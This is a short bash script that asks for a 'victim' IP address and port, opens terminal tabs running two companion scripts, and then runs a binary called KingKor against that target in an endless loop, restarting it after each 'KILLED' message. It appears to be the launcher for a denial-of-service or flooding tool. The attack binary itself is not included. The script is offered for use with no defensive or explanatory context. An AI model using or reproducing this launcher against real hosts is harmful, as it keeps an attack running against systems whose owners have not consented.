#!/bin/bash
echo "Enter Victim IP: "
read IP
echo "Enter Victim Port: "
read port
gnome-terminal --tab -e "./kingd.sh" --tab -e "./kingking.sh"
while [ true ]; do
     ./KingKor $IP $port
     echo ""
     echo ""
     echo ""
     echo "KILLED"
     echo ""
     echo ""
     echo "Restarting..."
     echo ""
     echo ""
     sleep 1
done
